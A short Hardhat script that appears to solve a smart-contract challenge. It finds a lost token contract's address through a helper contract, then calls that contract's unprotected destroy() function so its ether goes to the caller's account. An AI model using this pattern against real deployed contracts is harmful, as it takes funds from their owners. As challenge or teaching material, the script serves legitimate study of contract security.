const hre = require("hardhat");
const helperABI = require("../artifacts/contracts/RecoveryHelper.sol/RecoveryHelper.json").abi;
// Note the path because I just put the SimpleToken contract inside of the RecoverHelper.sol file.
const simpleTokenABI = require("../artifacts/contracts/RecoveryHelper.sol/SimpleToken.json").abi;

async function main() {

    const [deployer] = await hre.ethers.getSigners();
    console.log("Helping using MetaMask account:", deployer.address); 

    const targetAddress = "0x055Cb10731b64688c7d71C12Dc1f002229Da7D5b"
    const helperAddress = "0x521325954fcA04C4a8A60793eF08a6c50aeFb75E"
    const helperContract = new hre.ethers.Contract(helperAddress, helperABI, deployer);

    const recoveredAddress = await helperContract.recover(targetAddress);
    console.log("Recovered address:", recoveredAddress);

    const simpleTokenContract = new hre.ethers.Contract(recoveredAddress, simpleTokenABI, deployer);

    const recoverFundsViaDestroy = await simpleTokenContract.destroy(deployer.address);
    const receipt = await recoverFundsViaDestroy.wait();
    console.log("Recovery Receipt: ", receipt.hash)
  }

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });